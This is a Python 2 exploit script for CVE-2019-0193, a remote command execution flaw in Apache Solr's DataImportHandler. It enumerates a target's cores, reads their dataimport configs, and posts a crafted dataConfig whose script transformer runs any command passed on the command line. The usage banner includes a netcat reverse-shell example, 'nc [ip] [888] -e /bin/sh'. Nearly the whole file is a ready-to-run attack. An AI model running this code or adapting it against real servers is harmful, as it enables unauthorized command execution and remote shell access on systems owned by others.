import requests
import json
import sys


banner = '''
   _______      ________    ___   ___  __  ___          ___  __  ___ ____  
  / ____\ \    / /  ____|  |__ \ / _ \/_ |/ _ \        / _ \/_ |/ _ \___ \ 
 | |     \ \  / /| |__ ______ ) | | | || | (_) |______| | | || | (_) |__) |
 | |      \ \/ / |  __|______/ /| | | || |\__, |______| | | || |\__, |__ < 
 | |____   \  /  | |____    / /_| |_| || |  / /       | |_| || |  / /___) |
  \_____|   \/   |______|  |____|\___/ |_| /_/         \___/ |_| /_/|____/ 
                                                                           
                          python By jas502n                                              
Usage:
	python CVE-2019-0193.py http://192.168.2.18:8983 "[cmd]"
	python CVE-2019-0193.py http://192.168.2.18:8983 "calc"
	python CVE-2019-0193.py http://192.168.2.18:8983 "nc [ip] [888] -e /bin/sh"
'''
print banner

def admin_cores(url, cmd):
    core_selector_url = url + '/solr/admin/cores?_=1565526689592&indexInfo=false&wt=json'
    r = requests.get(url=core_selector_url)
    json_strs = json.loads(r.text)
    if r.status_code ==200 and "responseHeader" in r.text:
        print "\nHere Have %s Core_name Exit!\n" % str(len(json_strs['status']))
        for core_selector in json_strs['status']:
            jas502n_Core_Name = json_strs['status']['%s'%core_selector]['name']
            print '\n>>>>The Core Name = %s' % jas502n_Core_Name
            show_config(url,jas502n_Core_Name)
            get_config_name(url,jas502n_Core_Name)
            URLDataSource_Poc(url,jas502n_Core_Name,cmd)
            
    else:
        print "No core_selector Exit!"
    


        
def show_config(url,jas502n_Core_Name):
    config_url = url + "/solr/"+ jas502n_Core_Name +"/dataimport?_=1565530241159&command=show-config&indent=on&wt=json"
    r1 = requests.get(config_url)
    
    if r1.status_code ==200 and 'dataConfig' in r1.text:
        print ">> config_url= %s"% config_url
        print ">%s dataConfig Exist!" % jas502n_Core_Name
    else:
        print "dataConfig No Exit!"



def get_config_name(url,jas502n_Core_Name):
    get_config_url = url + '/solr/'+ jas502n_Core_Name +'/dataimport?_=1565530241159&command=status&indent=on&wt=json'
    r2 = requests.get(get_config_url)
    if r2.status_code ==200 and 'config' in r2.text:
        print ">> get_config_url= %s" % get_config_url
        r2_json = json.loads(r2.text)
        r2_str = r2_json['initArgs']
        
        print '>get_config_name= %s' % r2_str[1][1]
        
    else:
        print "Core Config Name No Exit!"



def URLDataSource_Poc(url,jas502n_Core_Name,cmd):
    debug_model_url = url + '/solr/'+ jas502n_Core_Name +'/dataimport?_=1565530241159&indent=on&wt=json'
    payload = "command=full-import&verbose=false&clean=true&commit=true&debug=true&core=atom&dataConfig=%%3CdataConfig%%3E%%0A++%%3CdataSource+type%%3D%%22URLDataSource%%22%%2F%%3E%%0A++%%3Cscript%%3E%%3C!%%5BCDATA%%5B%%0A++++++++++function+poc()%%7B+java.lang.Runtime.getRuntime().exec(%%22%s%%22)%%3B%%0A++++++++++%%7D%%0A++%%5D%%5D%%3E%%3C%%2Fscript%%3E%%0A++%%3Cdocument%%3E%%0A++++%%3Centity+name%%3D%%22stackoverflow%%22%%0A++++++++++++url%%3D%%22https%%3A%%2F%%2Fstackoverflow.com%%2Ffeeds%%2Ftag%%2Fsolr%%22%%0A++++++++++++processor%%3D%%22XPathEntityProcessor%%22%%0A++++++++++++forEach%%3D%%22%%2Ffeed%%22%%0A++++++++++++transformer%%3D%%22script%%3Apoc%%22+%%2F%%3E%%0A++%%3C%%2Fdocument%%3E%%0A%%3C%%2FdataConfig%%3E&name=dataimport" % cmd
    headers = {
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language":"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
    "Accept-Encoding":"gzip, deflate",
    "Content-type":"application/x-www-form-urlencoded",
    "X-Requested-With":"XMLHttpRequest",
    "Referer":"http://%s/solr/" % url

    }
    r3 = requests.post(url = debug_model_url, data=payload,headers=headers)
    print ">>>>> debug_model_url= %s" % debug_model_url
    if r3.status_code ==200 and 'Requests' in r3.text:

        print "Send Poc Success!"
    else:
        print "No Send Poc Success!"
        print r3.text



if __name__ == '__main__':
    cmd = sys.argv[2]
    url = sys.argv[1]
    admin_cores(url,cmd)
